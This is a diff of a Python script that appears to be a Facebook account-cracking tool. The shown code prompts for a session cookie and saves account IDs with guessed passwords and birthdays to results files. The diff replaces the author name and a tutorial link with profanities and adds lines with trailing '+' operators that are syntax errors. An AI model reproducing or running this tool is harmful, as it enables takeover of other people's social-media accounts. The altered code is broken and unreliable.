@@ -1,5 +1,5 @@
 # -*- coding: utf-8
-# coded by syafik xd
+# coded by jancok xd
 # instagram.com/garing
 
 try:
@@ -92,7 +92,7 @@ def login():
 			
 def cookie():
 	logo()
-	print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Cookie : https://youtu.be/X7m_O_tZnTc")
+	print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Cookie : https://youtu.be/kontol")
 	cookie = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Cookie : \033[0;96m")
 	try:
 		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
@@ -279,8 +279,8 @@ def public():
 						data = s.get(url).json()
 						ttl = data['birthday'].replace("/","-")
 						nama = data['name']
-						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl)
-						cp.append(uid+'|'+pw+'|'+ttl)
+						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl +)
+						cp.append(uid+'|'+pw+'|'+ttl+)
 						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
 						save.close()
@@ -288,7 +288,7 @@ def public():
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '       ')
+					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + ' + ttl + ')
 					cp.append(uid+'|'+pw)
 					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
@@ -371,8 +371,8 @@ def followers():
 						data = s.get(url).json()
 						ttl = data['birthday'].replace("/","-")
 						nama = data['name']
-						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl)
-						cp.append(uid+'|'+pw+'|'+ttl)
+						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl +)
+						cp.append(uid+'|'+pw+'|'+ttl+)
 						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
 						save.close()
